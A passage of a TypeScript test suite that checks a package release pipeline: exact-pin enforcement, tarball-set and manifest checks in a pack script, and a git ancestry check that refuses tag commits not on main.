  const dir = mkdtempSync(join(SCRATCH, "pack-"));
  writeFileSync(
    join(dir, "package.json"),
    JSON.stringify({ name: "@tpsdev-ai/root", version: opts.rootVersion ?? opts.version, workspaces: ["packages/*"] }, null, 2),
  );
  const dirs = ["."];
  for (const [pkg, meta] of Object.entries(opts.packages)) {
    const pdir = join(dir, "packages", pkg);
    mkdirSync(pdir, { recursive: true });
    const manifest: Record<string, unknown> = { name: meta.name ?? `@tpsdev-ai/${pkg}`, version: opts.version };
    if (meta.private) manifest.private = true;
    if (meta.deps) manifest.dependencies = meta.deps;
    writeFileSync(join(pdir, "package.json"), JSON.stringify(manifest, null, 2));
    if (!meta.private) dirs.push(`packages/${pkg}`);
  }
  return { dir, dirs };
}

function runPackScript(fixture: PackFixture, out: string, extraDirs?: string[]) {
  writeFakePackNpm();
  const dirs = extraDirs ?? fixture.dirs;
  return spawnSync(
    process.execPath,
    [PACK_SCRIPT, "--root", fixture.dir, "--out", out, "--version", "1.2.3", "--dirs", ...dirs],
    {
      encoding: "utf8",
      env: {
        ...process.env,
        PATH: `${BIN}:${process.env.PATH}`,
        GITHUB_REPOSITORY: "tpsdev-ai/flair",
        GITHUB_REF_NAME: "v1.2.3",
        GITHUB_SHA: "abcdef0123456789abcdef0123456789abcdef01",
        GITHUB_RUN_ID: "123456789",
        GITHUB_RUN_ATTEMPT: "1",
      },
    },
  );
}

describe("the pack script enforces the exact-pin invariant and the tarball set", () => {
  test("positive control: exact pins, one tarball per package, a manifest written", () => {
    const fixture = makePackFixture({
      version: "1.2.3",
      packages: { a: {}, b: { deps: { "@tpsdev-ai/a": "1.2.3" } } },
    });
    const out = mkdtempSync(join(SCRATCH, "out-"));
    const r = runPackScript(fixture, out);
    expect(r.status).toBe(0);
    const manifest = JSON.parse(readFileSync(join(out, "manifest.json"), "utf8"));
    expect(manifest.packages.map((p: { name: string }) => p.name)).toEqual(["@tpsdev-ai/a", "@tpsdev-ai/b", "@tpsdev-ai/root"]);
    expect(manifest.packageSetDigest).toMatch(/^[0-9a-f]{64}$/);
    // F6: the manifest carries the run identity and tool versions.
    expect(manifest.repo).toBe("tpsdev-ai/flair");
    expect(manifest.tag).toBe("v1.2.3");
    expect(manifest.commit).toBe("abcdef0123456789abcdef0123456789abcdef01");
    expect(manifest.runId).toBe("123456789");
    expect(manifest.runAttempt).toBe("1");
    expect(manifest.tools.node).toBeTruthy();
    expect(manifest.tools.npm).toBeTruthy();
    expect(r.stdout).toContain("package-set-digest=");
  });

  test("(F8) a caret on an UNSCOPED lockstep member also fails the pack", () => {
    const fixture = makePackFixture({
      version: "1.2.3",
      packages: { a: { name: "plain-a" }, b: { deps: { "plain-a": "^1.2.3" } } },
    });
    const out = mkdtempSync(join(SCRATCH, "out-"));
    const r = runPackScript(fixture, out);
    expect(r.status).not.toBe(0);
    expect(`${r.stdout}${r.stderr}`).toContain("exact-pin");
    expect(readdirSync(out).filter((f) => f.endsWith(".tgz")).length).toBe(0);
  });

  test("(c) one caret @tpsdev-ai/* pin fails the pack before any tarball is built", () => {
    const fixture = makePackFixture({
      version: "1.2.3",
      packages: { a: {}, b: { deps: { "@tpsdev-ai/a": "^1.2.3" } } },
    });
    const out = mkdtempSync(join(SCRATCH, "out-"));
    const r = runPackScript(fixture, out);
    expect(r.status).not.toBe(0);
    expect(`${r.stdout}${r.stderr}`).toContain("exact-pin");
    expect(readdirSync(out).filter((f) => f.endsWith(".tgz")).length).toBe(0);
  });

  test("(d) skipping a package fails the pack", () => {
    const fixture = makePackFixture({ version: "1.2.3", packages: { a: {}, b: {} } });
    const out = mkdtempSync(join(SCRATCH, "out-"));
    const r = runPackScript(fixture, out, fixture.dirs.filter((d) => d !== "packages/b"));
    expect(r.status).not.toBe(0);
    expect(`${r.stdout}${r.stderr}`).toContain("missing");
  });

  test("(d) packing a package twice (a duplicated directory) fails the pack", () => {
    const fixture = makePackFixture({ version: "1.2.3", packages: { a: {}, b: {} } });
    const out = mkdtempSync(join(SCRATCH, "out-"));
    const r = runPackScript(fixture, out, [...fixture.dirs, "packages/a"]);
    expect(r.status).not.toBe(0);
    expect(`${r.stdout}${r.stderr}`).toContain("twice");
  });

  test("(d) an extra tarball in the output directory fails the pack", () => {
    const fixture = makePackFixture({ version: "1.2.3", packages: { a: {}, b: {} } });
    const out = mkdtempSync(join(SCRATCH, "out-"));
    const r = runPackScript(fixture, out);
    expect(r.status).toBe(0);
    // A stray tarball in the output directory (a second pack, or a stray file)
    // must refuse rather than be silently carried into the manifest.
    const out2 = mkdtempSync(join(SCRATCH, "out-"));
    writeFileSync(join(out2, "rogue-9.9.9.tgz"), "stale");
    const r2 = runPackScript(fixture, out2);
    expect(r2.status).not.toBe(0);
    expect(`${r2.stdout}${r2.stderr}`).toContain("unexpected");
  });
});

// ── the restored ancestry check (F1) ──────────────────────────────────────────

function ancestryShell(text: string): string {
  const doc = yaml.load(text) as WorkflowDoc;
  const step = (doc.jobs!["stage-publish"]!.steps ?? []).find(
    (s) => typeof s.run === "string" && s.run.includes("merge-base --is-ancestor"),
  );
  if (!step?.run) throw new Error("release-publish.yml has no ancestry step");
  return step.run;
}

function gitAt(args: string[], cwd: string) {
  return spawnSync("git", args, {
    cwd,
    encoding: "utf8",
    env: {
      ...process.env,
      GIT_AUTHOR_NAME: "fixture",
      GIT_AUTHOR_EMAIL: "fixture@example.invalid",
      GIT_COMMITTER_NAME: "fixture",
      GIT_COMMITTER_EMAIL: "fixture@example.invalid",
    },
  });
}

describe("the restored ancestry check refuses a tag commit not on main (F1)", () => {
  test("a commit on main passes; a side-branch commit is refused before any stage request", () => {
    const root = mkdtempSync(join(SCRATCH, "anc-"));
    const bare = join(root, "origin.git");
    const work = join(root, "work");
    mkdirSync(bare);
    mkdirSync(work);
    expect(gitAt(["init", "-q", "--bare", "--initial-branch=main"], bare).status).toBe(0);
    expect(gitAt(["init", "-q", "--initial-branch=main"], work).status).toBe(0);
    writeFileSync(join(work, "a.txt"), "a");
    gitAt(["add", "-A"], work);
    expect(gitAt(["commit", "-q", "-m", "base"], work).status).toBe(0);
    gitAt(["remote", "add", "origin", bare], work);
    expect(gitAt(["push", "-q", "origin", "main"], work).status).toBe(0);
    const onMain = gitAt(["rev-parse", "HEAD"], work).stdout.trim();

    expect(gitAt(["checkout", "-q", "-b", "side"], work).status).toBe(0);
    writeFileSync(join(work, "b.txt"), "b");
    gitAt(["add", "-A"], work);
    expect(gitAt(["commit", "-q", "-m", "side"], work).status).toBe(0);
    const side = gitAt(["rev-parse", "HEAD"], work).stdout.trim();
    gitAt(["checkout", "-q", "main"], work);

    const sh = join(root, "ancestry.sh");
    writeFileSync(sh, ancestryShell(realWorkflow()));
    const run = (sha: string) =>
      spawnSync("bash", [sh], { cwd: work, encoding: "utf8", env: { ...process.env, GITHUB_SHA: sha } });

    const ok = run(onMain);
    expect(ok.status).toBe(0);
    expect(`${ok.stdout}${ok.stderr}`).toContain("is on main");

    const bad = run(side);
    expect(bad.status).not.toBe(0);
    expect(`${bad.stdout}${bad.stderr}`).toContain("not an ancestor of origin/main");
  });
});
